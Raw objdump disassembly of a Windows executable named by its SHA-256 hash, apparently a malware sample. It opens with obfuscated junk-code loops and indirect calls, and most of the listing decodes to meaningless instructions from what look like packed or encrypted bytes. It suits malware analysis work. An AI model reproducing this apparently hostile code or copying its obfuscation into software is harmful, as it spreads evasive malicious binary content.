
44c8fd6be614f8b9bdcbad8dcf1c46c3100cf0fbf670cda03ddbdd16a7f3a045.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e19c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fd71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fd59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fd59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fd59,ecx
  401068:	cmp    DWORD PTR ds:0x42fd59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fd59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e5a7
  401090:	cmp    DWORD PTR ds:0x42fd59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fd59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fd59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e1a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e78b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e77b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e77b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e77b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e1a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e34f
  401100:	cmp    DWORD PTR ds:0x42e77b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e77b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e77b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e77b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e77b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e19c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e19c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e19c,esi
  401145:	cmp    DWORD PTR ds:0x42e19c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e5ab
  401160:	cmp    DWORD PTR ds:0x42e19c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e19c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e19c,esi
  40117c:	cmp    DWORD PTR ds:0x42e19c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e1b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e1b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e1b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fdfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e2a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e4cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e1b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e1b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e77b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd85
  4011f8:	adc    esi,DWORD PTR ds:0x42fd89
  4011fe:	mov    DWORD PTR ds:0x42fd85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e783,0x17
  401216:	cmp    DWORD PTR ds:0x42e783,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e783,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e246
  401238:	push   0x42e1fd
  40123d:	call   DWORD PTR ds:0x42e5af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e783
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e783,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fdfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fdfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fdfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e2a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e5b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fdfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fdfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	mov    ds:0x70b2bbb9,eax
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	or     DWORD PTR [edx],eax
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	dec    edx
  4013a8:	add    esp,ebx
  4013aa:	(bad)  
  4013ab:	cli    
  4013ac:	cs dec edx
  4013ae:	clc    
  4013af:	jmp    0xfa07:0x4228e98a
  4013b6:	ds popa 
  4013b8:	test   BYTE PTR [edi-0x16],bh
  4013bb:	shl    dh,cl
  4013bd:	xor    BYTE PTR [ebp-0x2cee3c9a],0x5d
  4013c4:	adc    edx,ecx
  4013c6:	sbb    eax,DWORD PTR [edx]
  4013c8:	push   es
  4013c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013ca:	ror    DWORD PTR [ebp+0x4c2f1de0],1
  4013d0:	push   cs
  4013d1:	je     0x401405
  4013d3:	add    ebp,DWORD PTR [esi-0x4c564806]
  4013d9:	xor    eax,0x66f4fd0d
  4013de:	icebp  
  4013df:	push   edi
  4013e0:	scas   eax,DWORD PTR es:[edi]
  4013e1:	in     al,dx
  4013e2:	into   
  4013e3:	(bad)  
  4013e4:	(bad)  
  4013e6:	and    ecx,DWORD PTR [edi]
  4013e8:	ror    BYTE PTR [ebx],1
  4013ea:	(bad)  
  4013eb:	adc    DWORD PTR [edi],ecx
  4013ed:	in     al,dx
  4013ee:	(bad)  [edi]
  4013f0:	push   esi
  4013f1:	pushf  
  4013f2:	in     eax,0xe4
  4013f4:	push   ecx
  4013f5:	add    BYTE PTR [ebx+0x6],0x5b
  4013f9:	imul   edx,DWORD PTR [edi+0x6b],0x7d
  4013fd:	cmc    
  4013fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013ff:	dec    eax
  401400:	sahf   
  401401:	fxch   st(6)
  401403:	fmul   QWORD PTR [esi-0x37]
  401406:	sbb    BYTE PTR [ebx-0x2e],bh
  401409:	adc    bl,BYTE PTR [ebp-0x6f]
  40140c:	popa   
  40140d:	pop    ebx
  40140e:	sbb    eax,0x99b6d41f
  401413:	lds    eax,FWORD PTR [edi]
  401415:	jecxz  0x40140c
  401417:	mov    edx,0xada0ffbd
  40141c:	mov    ch,0xef
  40141e:	adc    ebp,ecx
  401420:	mov    dh,BYTE PTR [ebx+ebx*4]
  401423:	sbb    eax,0xd399ad1a
  401428:	sti    
  401429:	push   cs
  40142a:	inc    ecx
  40142b:	push   edx
  40142c:	pop    ds
  40142d:	out    0xc,al
  40142f:	ret    0xf612
  401432:	(bad)  
  401435:	cdq    
  401436:	jo     0x4013ee
  401438:	pop    ecx
  401439:	pop    ss
  40143a:	js     0x40145b
  40143c:	in     al,0x4f
  40143e:	cmp    DWORD PTR [ebx],esp
  401440:	xchg   esp,eax
  401441:	mov    gs,ecx
  401443:	aas    
  401444:	inc    edi
  401445:	js     0x401428
  401447:	aad    0x79
  401449:	xchg   edi,eax
  40144a:	leave  
  40144b:	(bad)  
  40144c:	xor    DWORD PTR [ebp+0x49a53a61],esi
  401452:	loope  0x4014c6
  401454:	xor    bl,BYTE PTR ds:0x9d131f58
  40145a:	push   edi
  40145b:	fidiv  DWORD PTR [esi-0x7d]
  40145e:	push   ss
  40145f:	popf   
  401460:	aas    
  401461:	sub    cl,al
  401463:	sti    
  401464:	dec    eax
  401465:	xor    edi,DWORD PTR ds:0xc8d827ba
  40146b:	repnz rcl DWORD PTR [ecx+0x232fa34e],1
  401472:	fadd   QWORD PTR [esi+0x6d]
  401475:	pop    esi
  401476:	ret    0x21f5
  401479:	ficomp DWORD PTR [edi]
  40147b:	xchg   ecx,eax
  40147c:	adc    esp,ebx
  40147e:	sub    DWORD PTR ds:0x35af571d,ebp
  401484:	or     al,bh
  401486:	jmp    0xf822:0xdeb1ada2
  40148d:	rcr    BYTE PTR [edi+ecx*4-0x22],0x9a
  401492:	call   0xf730:0x163d76db
  401499:	outs   dx,DWORD PTR ds:[esi]
  40149a:	clc    
  40149b:	sahf   
  40149c:	stc    
  40149d:	mov    ss,WORD PTR [ebp+ebx*4-0x2481c67]
  4014a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014a5:	inc    edi
  4014a6:	and    DWORD PTR [esi+0x10],ebx
  4014a9:	push   esi
  4014aa:	sub    BYTE PTR [esi-0x5c994a51],ah
  4014b0:	adc    esi,DWORD PTR ds:0x80422303
  4014b6:	popf   
  4014b7:	getsec 
  4014b9:	stos   BYTE PTR es:[edi],al
  4014ba:	xchg   cl,ch
  4014bc:	out    dx,eax
  4014bd:	addr16 test al,0xa2
  4014c0:	xor    edx,DWORD PTR [esi-0x58]
  4014c3:	(bad)  
  4014c4:	mov    ah,0xd
  4014c6:	dec    ebx
  4014c7:	or     DWORD PTR [eax+0x4a],edx
  4014ca:	xor    ch,BYTE PTR [ebp-0x5c]
  4014cd:	add    ch,BYTE PTR [esi+ebp*1+0x2c0a7126]
  4014d4:	(bad)  
  4014d5:	push   esp
  4014d6:	or     eax,0x78acc1b4
  4014db:	or     ebx,DWORD PTR [eax]
  4014dd:	mov    bh,BYTE PTR [ecx+0x26ffbc7]
  4014e3:	add    al,0x4f
  4014e5:	stc    
  4014e6:	mov    edi,0xf29b6310
  4014eb:	je     0x401554
  4014ed:	xor    DWORD PTR [ecx+ebx*1+0x10ee008b],esi
  4014f4:	push   ecx
  4014f5:	scas   al,BYTE PTR es:[edi]
  4014f6:	mov    ah,BYTE PTR [edi-0x5c00e895]
  4014fc:	cmp    DWORD PTR [edx+0x4589663c],edi
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x73bae013]
  401516:	sbb    ah,cl
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	dec    edx
  401521:	xlat   BYTE PTR cs:[ebx]
  401523:	mov    dl,0xb5
  401525:	pushf  
  401526:	xchg   BYTE PTR [eax],al
  401528:	push   edx
  401529:	fimul  WORD PTR [ecx+0x3dfb70ca]
  40152f:	mov    eax,ds:0x3ce03601
  401534:	xchg   esp,eax
  401535:	mov    ds:0x28ba0dfa,eax
  40153a:	daa    
  40153b:	pop    ebx
  40153c:	pop    ebx
  40153d:	or     al,0xcf
  40153f:	jne    0x401590
  401541:	pushf  
  401542:	imul   ebp,DWORD PTR [ecx+0x2df7dc82],0x9abefd40
  40154c:	mov    al,ds:0x3d1d7c18
  401551:	dec    ebp
  401552:	adc    ah,bh
  401554:	mov    bl,BYTE PTR [ecx+0x39]
  401557:	enter  0x3dff,0x7e
  40155b:	or     eax,0xaec89360
  401560:	sub    BYTE PTR [esi],0x61
  401563:	mov    ebx,DWORD PTR [edx+0x55f8c8f6]
  401569:	iret   
  40156a:	pop    ds
  40156b:	in     al,dx
  40156c:	pushf  
  40156d:	mov    eax,0xc43e5477
  401572:	clc    
  401573:	dec    esi
  401574:	loope  0x401577
  401576:	sub    DWORD PTR [ebx+ebp*4],0xffffffd7
  40157a:	inc    ebp
  40157b:	hlt    
  40157c:	jl     0x401529
  40157e:	sbb    DWORD PTR [edi+0x2f],edx
  401581:	adc    al,0x82
  401583:	pop    edx
  401584:	(bad)  
  401585:	mov    eax,ds:0xf7988465
  40158a:	jecxz  0x401609
  40158c:	adc    eax,0x6b8b9538
  401591:	jg     0x401517
  401593:	mov    al,0xff
  401595:	movnti DWORD PTR [ebp-0x16a40510],ebx
  40159c:	sbb    al,0xae
  40159e:	(bad)  
  40159f:	int3   
  4015a0:	es mov ebp,0x6bf6f6b1
  4015a6:	and    eax,0xff645a8b
  4015ab:	push   ss
  4015ac:	push   edi
  4015ad:	fiadd  WORD PTR [eax-0x7a67e941]
  4015b3:	dec    edi
  4015b4:	jns    0x4015f2
  4015b6:	push   ebp
  4015b7:	rcr    BYTE PTR [ebp+0x3dbc4543],1
  4015bd:	xor    bl,al
  4015bf:	sub    eax,0x84498c6b
  4015c4:	stc    
  4015c5:	push   eax
  4015c6:	frstor [esi]
  4015c8:	ret    
  4015c9:	dec    esp
  4015ca:	mov    esp,0x5fb0a5d8
  4015cf:	inc    esi
  4015d0:	xchg   ebx,eax
  4015d1:	in     al,0x5b
  4015d3:	mov    esp,edx
  4015d5:	iret   
  4015d6:	(bad)  
  4015d8:	sub    edi,ebp
  4015da:	ins    BYTE PTR es:[edi],dx
  4015db:	xchg   ecx,eax
  4015dc:	imul   BYTE PTR [ecx+0x990f249]
  4015e2:	loop   0x4015ef
  4015e4:	(bad)  
  4015e5:	fld    TBYTE PTR [edi+0x1f23c26b]
  4015eb:	aam    0xb4
  4015ed:	mov    ?,WORD PTR [eax]
  4015ef:	test   DWORD PTR [eax+eiz*4+0xd],eax
  4015f3:	ins    BYTE PTR es:[edi],dx
  4015f4:	pop    esi
  4015f5:	(bad)  
  4015f6:	nop
  4015f7:	fmul   QWORD PTR [edi-0x3ebc67b9]
  4015fd:	iret   
  4015fe:	and    al,0x7d
  401600:	iret   
  401601:	mov    bl,0xf9
  401603:	xor    eax,0xc7d4d32c
  401608:	and    ch,ch
  40160a:	ja     0x401630
  40160c:	xchg   ah,dh
  40160e:	mov    eax,0xa4dc82fd
  401613:	(bad)  
  401614:	inc    DWORD PTR [ebp-0x3b41ccdf]
  40161a:	push   ecx
  40161b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40161c:	jns    0x4015f2
  40161e:	dec    esp
  40161f:	fs int 0xe7
  401622:	icebp  
  401623:	ins    BYTE PTR es:[edi],dx
  401624:	mov    ecx,0x1bce0956
  401629:	jmp    0x8099d481
  40162e:	mov    dh,0x19
  401630:	or     ch,BYTE PTR [edx+eax*4+0x48]
  401634:	dec    ecx
  401635:	mov    edx,ecx
  401637:	cmp    DWORD PTR [eax+esi*1-0xa],eax
  40163b:	cwde   
  40163c:	mov    ah,0xa8
  40163e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  401640:	xchg   esi,eax
  401641:	test   al,bh
  401643:	or     bl,BYTE PTR ss:[edx]
  401646:	pop    edx
  401647:	adc    DWORD PTR [edi],0x7fc60699
  40164d:	xor    al,0x4
  40164f:	push   cs
  401650:	jns    0x4015d4
  401652:	mov    ds:0xac265a5,eax
  401657:	sub    esp,edi
  401659:	shl    BYTE PTR [edx-0x2f],1
  40165c:	push   0xffffffd2
  40165e:	sahf   
  40165f:	cmp    ch,BYTE PTR [eax-0x4b3f1371]
  401665:	imul   esi,DWORD PTR [ebp-0x9],0x4abb535c
  40166c:	xchg   edi,eax
  40166d:	paddsw mm2,mm1
  401670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401671:	mov    ch,0xc
  401673:	xor    BYTE PTR [ecx],al
  401675:	sti    
  401676:	mov    edx,0x169bfcc1
  40167b:	pop    es
  40167c:	dec    esi
  40167d:	mov    al,0xfc
  40167f:	fnstcw WORD PTR [eax-0x3dd59b01]
  401685:	xchg   ecx,eax
  401686:	in     al,dx
  401687:	dec    esp
  401688:	(bad)  
  40168a:	or     esi,DWORD PTR [eax+0x77]
  40168d:	push   edi
  40168e:	push   esi
  40168f:	mov    al,0xb5
  401691:	sbb    al,0xdb
  401693:	ret    0x235c
  401696:	mov    edx,edx
  401698:	dec    ecx
  401699:	mov    esp,0xf6f05180
  40169e:	pop    esi
  40169f:	push   ebx
  4016a0:	in     al,0x17
  4016a2:	lods   eax,DWORD PTR ds:[esi]
  4016a3:	jp     0x4016f1
  4016a5:	ins    BYTE PTR es:[edi],dx
  4016a6:	dec    ebp
  4016a7:	jecxz  0x401699
  4016a9:	in     al,dx
  4016aa:	int    0x8a
  4016ac:	mov    ebx,0x6adf260e
  4016b1:	and    BYTE PTR [ecx],dl
  4016b3:	stos   DWORD PTR es:[edi],eax
  4016b4:	nop
  4016b5:	push   esi
  4016b6:	xor    DWORD PTR [ecx+0x5c],edi
  4016b9:	outs   dx,BYTE PTR ds:[esi]
  4016ba:	pop    ebp
  4016bb:	jmp    0x3b72:0xe580c1fe
  4016c2:	mov    ebp,0x47c68fb
  4016c7:	lods   al,BYTE PTR ds:[esi]
  4016c8:	pop    edx
  4016c9:	pop    eax
  4016ca:	dec    edi
  4016cb:	pop    edx
  4016cc:	cmp    edx,esp
  4016ce:	mov    dl,0xbd
  4016d0:	int    0x4b
  4016d2:	mov    al,0x84
  4016d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016d5:	les    ebx,FWORD PTR [eax-0x76e9c4e3]
  4016db:	mov    eax,ds:0xdebe0c6d
  4016e0:	add    al,0xde
  4016e2:	xor    eax,0xeb1a4675
  4016e7:	or     dl,BYTE PTR [eax+edx*1]
  4016ea:	xchg   esi,eax
  4016eb:	pop    di
  4016ed:	dec    edi
  4016ee:	push   ss
  4016ef:	les    edx,FWORD PTR [eax+0x61]
  4016f2:	pop    ebx
  4016f3:	jnp    0x401708
  4016f5:	mov    ecx,0xf8a156ce
  4016fa:	cmp    ebp,ebp
  4016fc:	mov    eax,0x49023203
  401701:	les    ecx,FWORD PTR [di]
  401704:	sub    bl,BYTE PTR [edx]
  401706:	mov    eax,es
  401708:	push   0xa8da0cf3
  40170d:	push   0x41
  40170f:	inc    ebp
  401710:	icebp  
  401711:	mov    ss,WORD PTR [edi]
  401713:	hlt    
  401714:	test   eax,0x7ce29180
  401719:	and    al,0xff
  40171b:	push   ecx
  40171c:	xchg   edx,eax
  40171d:	sub    ebp,DWORD PTR [eax]
  40171f:	add    al,0x8d
  401721:	inc    ebp
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	ror    BYTE PTR [ebx+0x7c70df50],0x70
  401747:	jo     0x4017b9
  401749:	jle    0x4017bb
  40174b:	jo     0x4016fa
  40174d:	adc    ebp,DWORD PTR [esi-0x56e1492f]
  401753:	sbb    ah,BYTE PTR [esi+0x623a4a1c]
  401759:	adc    DWORD PTR [eax],edi
  40175b:	jle    0x4017bb
  40175d:	(bad)  
  40175e:	xor    dl,BYTE PTR [edx]
  401760:	sbb    eax,DWORD PTR [ebp-0xc4386c]
  401766:	add    al,0x81
  401768:	std    
  401769:	mov    cl,0x58
  40176b:	push   eax
  40176c:	jns    0x40176b
  40176e:	imul   esi,DWORD PTR [edx],0x7
  401771:	rol    al,0x41
  401774:	imul   edi,DWORD PTR [eax],0x7a004569
  40177a:	push   edx
  40177b:	bound  edx,QWORD PTR ss:[edx]
  40177e:	adc    bl,bh
  401780:	cwde   
  401781:	(bad)  
  401782:	idiv   BYTE PTR [ebx+0x10]
  401785:	adc    bh,BYTE PTR [eax+ebx*2]
  401788:	imul   ecx,edx,0x44067486
  40178e:	retf   0x3316
  401791:	mov    ds:0x9c46ffc4,al
  401796:	jb     0x4017e2
  401798:	ins    BYTE PTR es:[edi],dx
  401799:	mov    bl,0x22
  40179b:	adc    eax,0x458a78b1
  4017a0:	fisub  DWORD PTR [esi+0x1d523de6]
  4017a6:	retf   0xeb4f
  4017a9:	bound  edx,QWORD PTR [esi+0x5c]
  4017ac:	std    
  4017ad:	xor    bh,dh
  4017af:	imul   edi,esp,0x9af89d84
  4017b5:	push   esp
  4017b6:	jo     0x40182c
  4017b8:	and    DWORD PTR [esi],edi
  4017ba:	mov    eax,0xb590073f
  4017bf:	test   DWORD PTR ds:0x1b6696f7,esp
  4017c5:	add    ah,BYTE PTR [eax-0x2c]
  4017c8:	dec    esp
  4017c9:	fdivr  QWORD PTR [edi-0x58]
  4017cc:	inc    esi
  4017cd:	jbe    0x40174f
  4017cf:	cld    
  4017d0:	stos   BYTE PTR es:[edi],al
  4017d1:	jns    0x4017c8
  4017d3:	bound  esi,QWORD PTR [edi+0x7bc629dd]
  4017d9:	daa    
  4017da:	sbb    eax,0x36f12e96
  4017df:	imul   edi,DWORD PTR ds:0x91377654,0xffffffa8
  4017e6:	call   0xa5635735
  4017eb:	mov    dl,0x2e
  4017ed:	add    eax,0x40d2198d
  4017f2:	mov    dl,0x1e
  4017f4:	sub    bh,BYTE PTR [esi+0x48115667]
  4017fa:	adc    al,0x4e
  4017fc:	xchg   edx,eax
  4017fd:	in     eax,dx
  4017fe:	data16 mov bl,0x4e
  401801:	call   DWORD PTR [esi-0x1ceab82d]
  401807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401808:	fwait
  401809:	jge    0x40178f
  40180b:	sbb    dl,ch
  40180d:	outs   dx,DWORD PTR ds:[esi]
  40180e:	cmp    dh,BYTE PTR [eax-0x4ac7637e]
  401814:	fidiv  DWORD PTR [eax]
  401816:	xor    cl,BYTE PTR ds:0x4f7c7ea8
  40181c:	jnp    0x40182b
  40181e:	icebp  
  40181f:	xchg   DWORD PTR [ecx-0xe],edi
  401822:	xchg   al,bl
  401824:	jbe    0x40183c
  401826:	mov    ebx,0x1c7b32d6
  40182b:	push   0x58
  40182d:	xchg   esp,eax
  40182e:	shl    DWORD PTR [ecx],1
  401830:	daa    
  401831:	xchg   esp,eax
  401832:	popf   
  401833:	push   eax
  401834:	call   0x1adb84e5
  401839:	dec    esi
  40183a:	fcomp  QWORD PTR [ebx+eiz*4]
  40183d:	or     cl,BYTE PTR [ebx]
  40183f:	push   0x219665a6
  401844:	jne    0x4017da
  401846:	sub    eax,0xcd0089cd
  40184b:	int3   
  40184c:	pop    ds
  40184d:	sahf   
  40184e:	shr    al,1
  401850:	out    dx,al
  401851:	cmp    dh,BYTE PTR [ebp-0x561d1e6d]
  401857:	sbb    eax,0xb6f3faf7
  40185c:	fisub  DWORD PTR [ebp-0x4db39a6f]
  401862:	pop    es
  401863:	mov    ebx,0x227f3407
  401868:	xchg   ecx,eax
  401869:	mov    ebp,0xaa730fb3
  40186e:	mov    dl,0x70
  401870:	jg     0x40181d
  401872:	ret    0xbd71
  401875:	add    eax,0x24621ab4
  40187a:	inc    esp
  40187b:	jbe    0x4018b4
  40187d:	jbe    0x40181d
  40187f:	call   0xcbc6f59c
  401884:	icebp  
  401885:	sbb    DWORD PTR [ebx+ebx*8],ebx
  401888:	xchg   ebx,eax
  401889:	inc    esi
  40188a:	inc    ebx
  40188b:	mov    esp,0x7c8fdad9
  401890:	or     al,0x52
  401892:	inc    ebp
  401893:	push   ebp
  401894:	daa    
  401895:	or     esp,ebx
  401897:	test   al,0xae
  401899:	imul   edx,DWORD PTR [ebx+eiz*4-0x1],0x5f62f5c9
  4018a1:	adc    eax,0x72fde85d
  4018a6:	cmp    ebx,ebx
  4018a8:	push   0xd6e38ab5
  4018ad:	leave  
  4018ae:	xchg   dh,ah
  4018b0:	mov    ds:0x716a0731,eax
  4018b5:	add    BYTE PTR [esi-0x39],ch
  4018b8:	cld    
  4018b9:	mov    ebx,DWORD PTR [ebx]
  4018bb:	stc    
  4018bc:	mov    BYTE PTR [ebp-0x73],bl
  4018bf:	pop    es
  4018c0:	inc    ebx
  4018c1:	(bad)  
  4018c2:	mov    cs,WORD PTR [ebx+0x51]
  4018c5:	jl     0x401858
  4018c7:	sub    edi,esp
  4018c9:	cwde   
  4018ca:	dec    edi
  4018cb:	stos   DWORD PTR es:[edi],eax
  4018cc:	fst    QWORD PTR [edi]
  4018ce:	mov    ebp,0x94d62da7
  4018d3:	(bad)  
  4018d4:	addr16 mov ebp,0x4668b4c0
  4018da:	sahf   
  4018db:	clc    
  4018dc:	adc    dh,BYTE PTR [ecx+esi*4-0x34c5e9ae]
  4018e3:	std    
  4018e4:	popf   
  4018e5:	dec    ecx
  4018e6:	pop    esi
  4018e7:	jbe    0x401910
  4018e9:	sti    
  4018ea:	pop    DWORD PTR [edi-0x59]
  4018ed:	mov    ds:0x780ab8fe,eax
  4018f2:	inc    ebp
  4018f3:	call   0x9829:0xbca1d510
  4018fa:	cld    
  4018fb:	jmp    0x40189e
  4018fd:	pushf  
  4018fe:	rol    BYTE PTR [edi-0x6aebd7ec],1
  401904:	enter  0x9989,0xc9
  401908:	add    eax,0xe3a212bd
  40190d:	loope  0x401987
  40190f:	daa    
  401910:	adc    edx,DWORD PTR ds:0x234ddad5
